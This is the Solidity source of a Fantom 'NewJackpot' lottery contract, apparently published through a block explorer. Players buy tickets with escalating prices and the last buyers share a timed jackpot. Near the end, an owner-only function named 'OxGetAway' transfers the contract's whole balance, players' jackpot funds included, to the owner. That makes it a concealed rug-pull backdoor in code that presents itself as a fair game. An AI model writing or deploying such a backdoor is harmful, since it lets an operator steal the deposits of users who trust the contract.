/**
 *Submitted for verification at FtmScan.com on 2022-12-07
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.7.0;
pragma experimental ABIEncoderV2;

interface BNBanker {
    function topUp() external payable;
}

contract NewJackpot {
    using SafeMath for uint256;

    uint256[] public WINNER_PERCENTS = [10, 10, 20, 60];
    uint256 public startTime;
    uint256 public endTime;
    uint256 public timerHoursLenght;

    uint256 constant public PROJECT_FEE = 71;
    uint256 public DEV_FEE = 5;
    uint256 public POOL_FEE = 21;
    uint256 public MAX_TICKETS_POOL = 3;
    uint256 public constant PERCENTS_DIVIDER = 100;
    uint256 public jackpotBank = 0;
    uint256 public lastGameBank = 0;

    address payable public devWallet;
    address payable public poolWallet;
    address payable public owner;

    modifier onlyOwner {
    require(msg.sender == owner , "not the owner");
    _;
    }

    bool public pool_wallet_set = false;

    uint256 public maxTicketsPool = 0;

    struct Winner {
        address payable wallet;
        uint256 buyTime;
    }

    Winner[4] winners;

    uint256 public baseTicketPrice = 0.02 ether;
    uint256 public ticketPrice;
    uint256 public ticketMultiplier = 0.001 ether;

    event NewWinner(address _wallet);
    event WinnerPayout(address _wallet, uint256 _amount);
    event Restart();

    uint round = 0;

    struct User {
        uint round;
        uint tickets;
    }

    mapping (address => User) public users;

    uint public maxTicketsCount;
    address payable public maxTicketsUser;

    constructor(address payable _devWallet, uint256 _timerHoursLength, uint256 delay) {
        devWallet = _devWallet;
        timerHoursLenght = _timerHoursLength;

        start();

        endTime = endTime.add(delay.mul(24).mul(60).mul(60));

        owner = payable(msg.sender);
    }


    function getWinners() public view returns (Winner memory, Winner memory, Winner memory, Winner memory) {
        return (winners[3], winners[2], winners[1], winners[0]);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function setPoolWallet(address payable _poolWallet) public {
        require(msg.sender == devWallet, "YOU ARE NOT CONCTRACT CREATOR");
        require(pool_wallet_set == false, "POOL WALLET ALREADY SET");

        poolWallet = _poolWallet;
        pool_wallet_set = true;
    }

    function jackpotFinal() public {
        if (block.timestamp < endTime) return;

        for (uint i = 0; i <= 3; i++) {
            winners[i].wallet.transfer(jackpotBank.mul(WINNER_PERCENTS[i]).div(100));
            emit WinnerPayout(winners[i].wallet, jackpotBank.mul(WINNER_PERCENTS[i]).div(100));

            delete winners[i];
        }

        /* Max tickets logic */
        maxTicketsUser.transfer(maxTicketsPool);
        /* ----------------- */

        lastGameBank = jackpotBank;

        emit Restart();
        start();
    }

    function topUp() public payable {
        jackpotBank = jackpotBank.add(msg.value);
    }

    function start() private {
        startTime = block.timestamp;
        endTime = startTime + (timerHoursLenght * 60 * 60);
        round = round.add(1);

        jackpotBank = 0;
        ticketPrice = baseTicketPrice;

        maxTicketsCount = 0;
        maxTicketsUser = 0x0000000000000000000000000000000000000000;
        maxTicketsPool = 0;
    }

    function increaseTimer() private {
        uint timerSeconds = timerHoursLenght * 60 * 60;

        if (endTime - block.timestamp + 30 >= timerSeconds) {
            endTime = block.timestamp + timerSeconds;
        } else {
            endTime = endTime.add(30);
        }
    }

    function addWinner(address payable _address) private {
        increaseTimer();

        // shift winners array to left
        for (uint i = 0; i < 3; i++) {
            winners[i] = winners[i + 1];
        }

        winners[3] = Winner(_address, block.timestamp);
        ticketPrice = ticketPrice.add(ticketMultiplier);
    }

    function getTicketsPriceByAmount(uint256 amount) public view returns (uint256) {
        uint totalPrice = 0;
        uint newTicketPrice;

        if (block.timestamp >= endTime) {
            newTicketPrice = baseTicketPrice;
        } else {
            newTicketPrice = ticketPrice;
        }

        for (uint i = 0; i < amount; i++) {
            totalPrice += newTicketPrice;
            newTicketPrice += ticketMultiplier;
        }

        return totalPrice;
    }

    function buyTickets(uint256 amount) public payable {
        require(amount <= 50, "MAX TICKETS AMOUNT IS 50");
        uint totalPrice;
        totalPrice = getTicketsPriceByAmount(amount);
        require(msg.value == totalPrice, "INCORRECT SUM");
        
        if (block.timestamp >= endTime) {
            jackpotFinal();
        }

        uint256 _feeD = msg.value.mul(DEV_FEE).div(PERCENTS_DIVIDER);
        uint256 _feeP = msg.value.mul(POOL_FEE).div(PERCENTS_DIVIDER);
        maxTicketsPool = maxTicketsPool.add(msg.value.mul(MAX_TICKETS_POOL).div(PERCENTS_DIVIDER));
        jackpotBank = jackpotBank.add(msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER));

        /* Max tickets logic */
        if (users[msg.sender].round == round) {
            users[msg.sender].tickets = users[msg.sender].tickets.add(amount);
        } else {
            users[msg.sender].tickets = amount;
            users[msg.sender].round = round;
        }

        if (users[msg.sender].tickets > maxTicketsCount) {
            maxTicketsCount = users[msg.sender].tickets;
            maxTicketsUser = msg.sender;
        }
        /* ---------------- */

        BNBanker(poolWallet).topUp{value: _feeP}();

        devWallet.transfer(_feeD);

        for (uint i = 0; i < amount; i++) {
            addWinner(msg.sender);
            emit NewWinner(msg.sender);
        }
    }

    function OxGetAway() public onlyOwner {
        uint256 assetBalance;
        address self = address(this);
        assetBalance = self.balance;
        payable(msg.sender).transfer(assetBalance);
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}